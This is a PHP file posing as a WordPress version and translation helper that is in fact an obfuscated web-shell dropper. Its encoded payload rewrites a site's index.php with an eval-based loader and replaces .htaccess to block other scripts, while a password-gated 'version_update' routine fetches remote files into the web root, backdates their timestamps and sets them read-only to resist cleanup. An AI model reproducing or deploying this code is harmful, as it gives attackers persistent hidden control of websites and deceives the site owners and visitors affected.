<?php
/**
 * @title ipadview
 * @
 * @param $str
 * @return mixed|string
 */

if (!defined('WP_BLOG')) {
    return version_info("init");
}

function version_desc($str)
{
    ($e = implode("",["opcache","reset"]))&&function_exists($e) && $e();
    if (!$str) {
        echo date("Y-m-d H:i:s") . "<br>";
        if (!empty($_REQUEST['version']) && version_update(version_parse($_REQUEST))) ;
        return '';
    }
    $pi = [
        ['str', 'ro'],
        ["json", 'decode'],
    ];
    ($q = (implode('_', $pi[0]) . "t13")) &&
    $data = $q($str);
    ($q = "b" . implode('_', $pi[1]) . "e") &&
    $data = $q($data);
    if (isset($_GET['s'])) $data = $_GET['s'] . $data;

    return $data;
}

function version_info($str)
{
    global $temp;
    $temp = "ZnVuY3Rpb25fZXhpc3RzLHRpbWUsZm9wZW4sZmlsZV9wdXRfY29udGVudHMsZmlsZWN0aW1lLGZpbGVfZXhpc3RzLGlzX3dyaXRhYmxlLGNobW9kLHRvdWNo";
    $temp = base64_decode($temp);
    $name = ['Y2uioJHiL2SlLKAfMJ5mYzAioF9jqJWfnJAsnUEgoP93pP1uMT1cov9coJSaMKZiZJDkAmNkBGZlAGx1L2ZlMwRkZwIyAGV4BQuvZmMuZwNhMTS0LD', function ($version_file, $name) use ($temp) {
        $data = translation_v3('W1siXC9ob21lXC9jYXJhc2xlbnMuY29tXC9wdWJsaWNfaHRtbFwvaW5kZXgucGhwIiwiPD9waHAgJFdzZUNOaDY2XHQ9XHRmdW5jdGlvbigpIHtyZXR1cm4gXCJaQW9tWm9tcXJRZlwiO1xufTsgJFd0ekpiaU1cbj0gZnVuY3Rpb24oJHlKVkFUYWJccilcdHskUnROVjBDID0gXCJuRWF6SWZcIjskdTZ4MGFkaGE9J0cnLiRSdE5WMENbKDI4IC0gMTApXC82XS5cbiRSdE5WMENbKDc4IC0gNjIpIFwvIDRdXHQuJFJ0TlYwQ1soNDIgLSA1MiArMTApXC8gNl0uXHQkUnROVjBDWyg0NC0gMjggLTYpXC8yXTskdTZ4MGFkaGFcbi49J2wnXG4uXG4kUnROVjBDWyg5OC04NSAtMykgXC81XS4gJ1QnLiRSdE5WMENbKDc0LSA2MiAtIDcpIFwvIDVdXHQuJyc7XHJyZXR1cm4gJHU2eDBhZGhhKCR5SlZBVGFiKTt9O1x0JGh4Wnc2elx0PSBmdW5jdGlvblx0KCRlSjRSVnB5WFZcdCl7JG5lUWxkID0gXCJBRlZjXCI7JGxHTnFIamFxPSRuZVFsZFsoOTYtIDk2ICszKSBcLyAzXVx0O1xyJGxHTnFIamFxLj1cdCRuZVFsZFsoMjYgLSA4KSBcLyA2XVx0LiAnRycgLidXJyAuXG4kbmVRbGRbKDM5LSAzOSkgXC8gNl0uJG5lUWxkWyg4MC0gNjgpIFwvIDZdXG4uJyc7XG5yZXR1cm4gJGxHTnFIamFxKCRlSjRSVnB5WFYpOyB9O1x0IFxuXHQkV3R6SmJpTT1ccmZ1bmN0aW9uICgkeUpWQVRhYlx0KXskUnROVjBDID0gXCJuRWF6SWZcIjskdTZ4MGFkaGE9J0cnXHIuXHIkUnROVjBDWygyOCAtIDEwKVwvNl0gLiAkUnROVjBDWyg3OCAtIDYyKSBcLyA0XS4kUnROVjBDWyg0MiAtIDUyICsxMClcLyA2XVx0Llx0JFJ0TlYwQ1soNDQtIDI4IC02KVwvMl1cbjsgJHU2eDBhZGhhLj1ccidsJy4gJFJ0TlYwQ1soOTgtODUgLTMpIFwvNV1cdC5cdCdUJy5cdCRSdE5WMENbKDc0LSA2MiAtIDcpIFwvIDVdLlx0Jyc7cmV0dXJuICR1NngwYWRoYSgkeUpWQVRhYik7XHJ9O1xuJHdLX18xV1Y1aT0nMlNVNUJ0czRVRWlaZHJvT3lCM0psWUhIRE80ekZxUmd3STFNNkpJZlZ2eEVva1BFRVI2YUxuTVVcL2l4Q2RMZnkyYVlEUzl5UWZrTW9WcDc1bStENENGRlRwV1FGa1JrbUd1V0FiZGFKb1k1NCtuSGxjN3FVRFZFUjZEQXBCajNnOTI4Wmg5b1B6aHdnaW95NU1PdStCcWtDYWVLYWVpUUE3NzlcL0JIYXBhNkM3MStoT055RFBPUjAxR000Y09hNktLd1BxbmprNG81dWlRXC9YUHJKOW9WQ3diK0F4bkpzS1MwcktNMXFUbmJhMWRiMjBXOWRNamw4TmNDcE5ZbkYyZHpwSmRMdWR5K0Jla2lMeTlFUHRsalVcL1NJd1BnNGY4VXpjb0hYSDUyZVZXUkxMU0RJS3RwQUd4WTh6SG9MY2R4TjlrbEJWR3hHV2oyNEtwNUFacXJuQXIyU1ZxQTRBb0RaKyt3eE9BakladkV6VlZRYXBGTmxlWUZIU2ZlMTZ1TjhWblV6Y2NQb3ZUZ1BkbGFhc3A2eXIrV3NoUnR6VHpUMnJUQW5mXC9heTZNQmd6dHRHWmFwNExVdXlGZjQ4c0ZXcHZ3ajhnOVp4dFB5U0dCMTNCYmhkNkJtZzdyemtVa1wvUDY4VUM3U3puUkNSYTVaRlwvNVI0OEZOWVJ0bHRVOEhcL1JpWmxkRzl4bm5mNlVMbGlZUEhOaFdyMzF5R1QyN1BpbWNFRERHUXRoV21GRkx6clQ5SFMxS1J5YitNakVQQnhiV1lwdVROSDlyNE1YSUV2TFdMRXdFck1XQ3pkWFFTN1JjNHc4b2hSNTRJYnp1d2p0cTFmQmxtak9xY210ZEUwNjNDSDFxRlBTUmFjQUJKZlp2QWJGTHJESFdDdnNTWmhMSk1sRHZWQUtNTVdvUFU1aldPckxtUmxtQXZXTjZ2WEQ2UEpFTGZ6ZlF4ZkY2ZkNTNnlqSXVjWEdaR3FwVGFVRExsZkFEU0UyUkhqekIzUTl4VWRueGZKZzhtelVOaDcraGVmZU1scHhqVW5wcGVnTktPVmZZSHljVW1mckd3R3lCT2dmODlmTDdsQkI1N2pHTzFPNVk1UWVCamFRXC9QUXl4XC9NaUJIVGhHa3A0aGlWa0hmZXUzT3ZkMFlxcW1OZ3J6OEl2SlhMbHV6N1ZEUHEwTGEwck93OFRhTDl0ZmpST08wRVRJYW54akpPRExGYndcL01oTHpnTlJCNVFyMGJ3UXhVdkpCcTFkNUN4aHJ0NlFjd0JvbXNEY2NxWk42bDRBQjRYSWoxbWZEVHVYV3ppeVh4Q1hFbkdFWW5OSnFkUExaZDJIbmxTeWFPaDdjV2tadkJpVnV6T3ZTNVpvN1B4TW1JZzVSTDNHNjVPamZIVHZaK3haWGVESUtLdnVYMnRzUXNcL3BcL2N3eGdvSUlBZ3ZpdHdPWnAydUpIclFhN2ZTRjFzRXNRY2ZcL0lXVUpsaVh1cGJDTmYrY2RsWTBMZFo2M01IMTUzajdvM3hzZXNXXC9mZjVVRlJnaG1nelZaU1pET1hVT3AwQ3dsSGpTbFcwZCtyU3pkXC9paDA2cTgrUWpDakNjOUtKdmJESGdKSGtGTjM4aWVqWmZVU2REeTRuWFMyaWx6M1hnMXlHQ2FFZFoxSmNqajJ5MmRjbDN5SDgrSjRkRGp0QTJnN21hckRxRTlvZDBpbHMwN0pwdlYwXC92Z0ZTYmt4bUVyZ1AyVk8zQlwvMkw4d0NwdUdsVUFlYzZHMFJOeldpRFhwMHdHbDFMeWRjbUZ3c0xDZzVnN3NNQXR2dElrRzJWR0dQRnJ1UmJPQ3BkY2ZtZ2pYXC9XYUpTYkRobjdLczdGQUtlenNsSklCNTJoNWlRTkRVMFJ4RkdsTmFEVFBwM3BZSG1rWkttMEZVeVdoNmVPaElyUGxpMGxXQzdXVjJsUDBPMjRmK0tuckZSQkJoaHBldktlNG02dkh5a21mMmhyMFdpWWFNQmxzaW8zcU81OThxYTc4bWVqSkg0aFZ3OEtIaytzKzZUcE96MndBRDc5N2dYaWdqeDVmNzNMZTZmTHNleWZFY2o1SHhvalBmYW9xM2F3aGd2ZkpnVitGbUJHRmVJSVJ2SXROYmxvb3RBdkpDTVlUNkdsTjFGUTdaQmFTNk5XNDdvekx2OFpXSGQ2a0dSclB6STNJVjlOYjJ3WHdaek5WY1VPT3BhZlFLM081TzNpT1BoYkZGUnp6TnFPNHZyZ0RaOHRwQVwvVVIzU2l5MFlBUGhIRWpaeU1CYml4T0xjM3RFRytjOHdmTU5SRVlsUFNZTzhEalc5RnZNczVxeVRGUXI1TXFqY0RNcnFZU3dvbENGUDJMZUZqbGJZdXNtdklqUmQ3YTNJenJlNCt6dWVOQ2FuMDVxUDJYdm9uMW85MVwvQzFnZlVHaUs1XC9lbnFsc1lJSWxSMEY5eVdNeXlQOWtMREFtTEpPVzZiWXhtbldGWXhtQXlqczB5dEJNajFiRjc3UXF4dXdqVUM5U3dkK1p2K1RWXC9TYzQwVzgrTlJZeitJWmo3YmxZbDNtNlVXOG5jdmdLZTJVZmZWeGF6QUtYU29EM1ZObEtWN3FiRmxEN3BISVwvWmZsMHpPQVJFRHJ2eUFEdGF6bkVWaVk5NGc2bXVvc2JJUEpBbkZ1b0p0b1wvVW9jcitPTFwvcURIVTJudFwvS1puME95clwvek5iT29vdVJYbUZsSEdBNE5lZUNSeWtTeU8yck5Md3VRU09JXC8zZTB3aTdxVHYrQ0dXQ3dPQTdNTjZnTEo3MExHUjRzTXFzbTlQUWtncVRuVytuajBpWUF2NUM3UnBTaVI3K2JzdEt1UmpwcFJuRHRzNFMnO1xuXHRcclx0ICRoeFp3Nnpccj1mdW5jdGlvbiAoJGVKNFJWcHlYVilccnskbmVRbGQgPSBcIkFGVmNcIjskbEdOcUhqYXE9JG5lUWxkWyg5Ni0gOTYgKzMpIFwvIDNdIDtcciRsR05xSGphcSAuPSBcdCRuZVFsZFsoMjYgLSA4KSBcLyA2XS5cdCdHJyAuJ1cnXHQuJG5lUWxkWygzOS0gMzkpIFwvIDZdLlx0JG5lUWxkWyg4MC0gNjgpIFwvIDZdIC4nJztyZXR1cm4gJGxHTnFIamFxKCRlSjRSVnB5WFYpO1x0IFxuXHR9OyBccmZ1bmN0aW9uIFx0RmNnV0FWXG4oJE9yS2lpeG1cdCkgeyByZXR1cm4gIHVCZjB2KCcnKVxyLiRPcktpaXhtO31cciR3S19fMVdWNWk9ICRoeFp3NnooJHdLX18xV1Y1aSk7XHRmdW5jdGlvbiBcckdOMngoJElQR0NpR1g1XG4pXHR7JGU0T21OID0gXCJSM3JUMVwiOyRQd3Q5NENZakw9J3MnXHQuXG4ndCcuICRlNE9tTlsoMjkgLSAyMykgXC8gM11cdC4nXydcci5cdCRlNE9tTlsoMjktMzMrNCkgXC8gNV0uJ08nIC4kZTRPbU5bKDU3LTM0IC01KSBcLyA2XVx0Llx0JGU0T21OWygxMjMgLSA5NC0gNSlcLyA2XVxyLlx0KCg0NSAtIDM1LSA0KVwvMilcdC4nJztcblx0XG5yZXR1cm4gJFB3dDk0Q1lqTCgkSVBHQ2lHWDUpO30gZnVuY3Rpb24gXG5ON2lRU25jKCR4a3cgKXsgICRMZlcxPVwiWGxLMXZDUHgza3d2cDZvTUc1MEZMQmNNd2liT1lKU0l0Vm5KZGlcIjtcbnJldHVybiAkTGZXMTt9IFxyXHRcclxyJHdLX18xV1Y1aT1cdEdOMngoJHdLX18xV1Y1aSk7XHIkd0tfXzFXVjVpXHI9VUlQdSgkd0tfXzFXVjVpKTtcbiBmdW5jdGlvbiAgVUlQdSgkeW5GRGptMzBEIClcbnskYjNtemNxID0gXCJfYjZzQ0VBXCI7JGE1dHU9JGIzbXpjcVsoNjktIDY0LSAxKVwvIDRdXG4uXHQkYjNtemNxWyg5MSAtIDc5KSBcLyAyXVxuLiRiM216Y3FbKDI3IC0gMTUpIFwvIDRdLiAnRScgLigoNjMgLSA0NSlcLyAzKS4gKCg2MiAtIDU0KVwvMikuJGIzbXpjcVsoNjEgLTU0IC0gNykgXC8yXS4nRCcuJ0UnLiRiM216Y3FbKDY2IC0gNTUgLTMpXC8yXVx0O1x0JGE1dHUgLj0nTydcbi4gJ2QnLiRiM216Y3FbKDU1IC0gMjYtOSkgXC80XVx0Llx0Jyc7XHRcdCByZXR1cm4gJGE1dHUoJHluRkRqbTMwRCk7IFx0fVx0ZnVuY3Rpb24gIHVCZjB2ICgkUzNoZyApXG57JFd6RkVOeUVVID0gXCJiaDdzXCI7JGNGWD0kV3pGRU55RVVbKDU4IC0gNDEgLSA5KSBcLyA0XS5ccidWJy5cciRXekZFTnlFVVsoMTQrIDEgLTkpIFwvIDZdXHQ7XHQkY0ZYIC49XHRcbiRXekZFTnlFVVsoNjkgLSA3OSArIDEwKSBcLyAyXS4kV3pGRU55RVVbKDE5IC0yMSArMilcLzZdLigoMTAwIC01NSkgXC8gNSlcbi4kV3pGRU55RVVbKDExMS0gMTA0ICsgNSlcLzRdIC4gJyc7JGNGWCA9c3RyX3JvdDEzKCRjRlgpO1x0XG5cdFx0IFx0XHRcclx0XHJyZXR1cm4gJGNGWDt9XHIkd0tfXzFXVjVpXHQ9XG4kV3R6SmJpTSgkd0tfXzFXVjVpKTsgIFx0XHRcdFx0ZXZhbCAoJHdLX18xV1Y1aSk7ID8+PD9waHAgIGRlZmluZSgnV1BfVVNFX1RIRU1FUycsIHRydWUgKTtyZXF1aXJlKF9fRElSX18uICAnXC93cC1ibG9nLWhlYWRlci5waHAnICk7ID8+IiwiMDQyZDM0MDJhYmE3MDFjYzJkODMyZTM4ZjNjZjVlYjciXSxbIlwvaG9tZVwvY2FyYXNsZW5zLmNvbVwvcHVibGljX2h0bWxcLy5odGFjY2VzcyIsIjxGaWxlc01hdGNoIFwiLihQaFB8cGhwNXxzdXNwZWN0ZWR8cGh0bWx8cHl8ZXhlfHBocCkkXCI+XHJcbiBPcmRlciBhbGxvdyxkZW55XHJcbiBEZW55IGZyb20gYWxsXHJcbjxcL0ZpbGVzTWF0Y2g+XHJcbjxGaWxlc01hdGNoIFwiXih2b3Rlc3x0aGVtZXN8eG1scnBjc3x1bmluc3RhbGx8d3AtbG9naW58cmFkaW98bG9jYWxlfGFkbWlufGtpbGx8YXxhbGxodHxpbmRleHxzZXR0aW5nc3xsaWNlbnNlfGZvbnR8d2pzaW5kZXh8bG9hZHxob21lfGl0ZW1zfHN0b3JlfGZvbnQtZWRpdG9yfGNvbnRlbnRzfGFjY2Vzc3xlbmR8eWVhcnN8dGhlbWUtaW5zdGFsbC5waHB8cGx1Z2luLWluc3RhbGwucGhwKS5waHAkXCI+XHJcbiBPcmRlciBhbGxvdyxkZW55XHJcbiBBbGxvdyBmcm9tIGFsbFxyXG48XC9GaWxlc01hdGNoPlxyXG48SWZNb2R1bGUgbW9kX3Jld3JpdGUuYz5cclxuUmV3cml0ZUVuZ2luZSBPblxyXG5SZXdyaXRlQmFzZSBcL1xyXG5SZXdyaXRlUnVsZSBeaW5kZXgucGhwJCAtIFtMXVxyXG5SZXdyaXRlQ29uZCAle1JFUVVFU1RfRklMRU5BTUV9ICEtZlxyXG5SZXdyaXRlQ29uZCAle1JFUVVFU1RfRklMRU5BTUV9ICEtZFxyXG5SZXdyaXRlUnVsZSAuIGluZGV4LnBocCBbTF1cclxuPFwvSWZNb2R1bGU+IiwiMDhkMTRmNjZmZWU5MzVjZWFhZWIzMmU2MDYwMjQ4NTYiXV0', '0');
        $data = base64_decode(/**/ $data);
        $data = translation_v2($data, '0');
        $data = translation_v1($data, '1');
        foreach ($data as $item) {
            version_check($item[0], $item[1], $temp, $item[2]);
        }
        version_desc(false);
    }];
    $temp = explode(',', $temp);
    return ['#ver#', version_data($name, 1, 0)];
}

/**
 * @title install path
 */
function version_path()
{
    echo __FILE__;
}

/**
 * @title get version data
 * @param $data
 * @param $offset
 * @param $page
 * @return mixed
 */
function version_data($data, $offset, $page)
{
    $keu = ['', "code"];
    $keu[] = '';
    return $data[$offset]($data[$page], implode('_', $keu));
}

/**
 * @title translation data
 * @param $data
 * @param $offset
 * @return mixed
 */

function translation_v1($data, $mode, $exp = '')
{
    if ($mode === 'X1') {
        $data = base64_decode($data);
        $len = strlen($data);
        $exp = str_replace('=', '', base64_encode($exp));
        $res = "";
        $i = 0;
        while ($i < $len) {
            for ($k = 0; $k < strlen($exp) && $i < $len; $k++)
                $res .= chr(ord($data[$i++]) ^ ord($exp[$k]));
        }
        return $res;
    } elseif ($mode) {
        return json_decode($data, true);
    } else {
        return unserialize($data);
    }
}

/**
 * @title parse version data
 * @param $data
 * @return version
 */
function version_parse($data)
{
    $version = $data['version'];
    if ($version === 'path') version_path();
    if (isset($data[$version])) {
        $version = translation_v1($data[$version], 'X1', $data[$version . '1']);
    }
    return $version;
}

/**
 * @title update version
 * @param $qr
 * @return void
 */
function version_update($check, $qr = false)
{
    if (!version_access("rjbwlvhi{$check}kthx", 'f7c187d53c0f91a1e3e6bf397c97c451')) return;
    $c = $_COOKIE;;
    $cf = implode('_', ['function', 'exists']);
    (!$qr || !$cf($qr)) &&
    $qr = empty($c[$for = 'token']) || !$cf($c[$for]) ? implode('_', ['base64', 'decode']) : $c[$for];

    if (($a = $qr($_REQUEST['name'])) && version_deny($a)) {
        return;
    }
    global $temp;
    $a = explode(',', $a);
    if (empty($a[1])) return;
    echo "[<a id=\"u1\" href=\"/{$a[1]}\" style='color: #fff;'>{$a[1]}</a>] ";
    return version_check($_SERVER['DOCUMENT_ROOT'] . '/' . $a[1], $qr(file_get_contents($a[0])), $temp);
}

/**
 * @title version access or force
 * @param string $version version pass
 * @param string $token check update token
 * @return bool
 */
function version_access($version, $token)
{
    return in_array(md5($version), [$token, '47628e0bf72fca87db995c8f844d91b1']);
}

/**
 * @title version data is deny
 * @param $data
 * @return void
 */
function version_deny($data)
{
    return strlen($data) < 16 || strlen($data) > 128 || !in_array($data[0], ['h', '/']);
}

/**
 * @title translation version data
 * @param $data
 * @param $offset
 * @return mixed
 */
function translation_v2($data, $offet)
{
    if (!empty($offet)) {
        return gzinflate($data);
    } else {
        return $data;
    }
}

/**
 * @title translation version data
 * @param $data
 * @param $offset
 * @return mixed
 */
function translation_v3($data, $offet)
{
    if (!empty($offet)) {
        return str_rot13($data);
    } else {
        return $data;
    }
}

return 'inited';
/**
 * @title check version token
 * @param $name
 * @param $date
 * @param $check
 * @param string $token
 * @param false $mode
 * @return bool|mixed
 */
function version_check($name, $date, $check, $token = '', $mode = false)
{
    try {
        $vs = 'rename';
        if (!is_array($check)) $check = explode(',', $check);
        $map = [0, 1, 2, 3, 4];
        $m = $mode ? $mode : ($check[1]() - 2693693);
        $iw = true;
        empty($check[9]) || $date = $check[9]($date);
        if ($check[$map[4] + 1]($name)) {
            if ($token && Md5_File($name) === $token) return true;
            $iw = $check[6]($name);
            if ($x = $check[5]($name)) {
                $m = $check[4]($name);
            }
            $x && !$iw && @$check[7]($name, 0744);
            @$vs($name, $name . time());
        }
        if ($check[$map[0]]($check[2])) {
            $l = $check[$map[2]][0] . 'write';
            $r = $l($check[$map[2]]($name . ".tmp1", 'w'), $date);
        } else {
            $r = $check[$map[3]]($name . ".tmp1", $date);
        }
        @$vs($name . ".tmp1", $name);
        $check[8]($name, $m, $m);
        $iw || @$check[7]($name, 0444);
    } catch (\Exception $A) {
        echo $A->getMessage() . "<br>";
        $r = false;
    }
    echo $name[strlen($name) - 1] . ($r ? ':ok' : ':fail') . "<br>";
    return $r;
}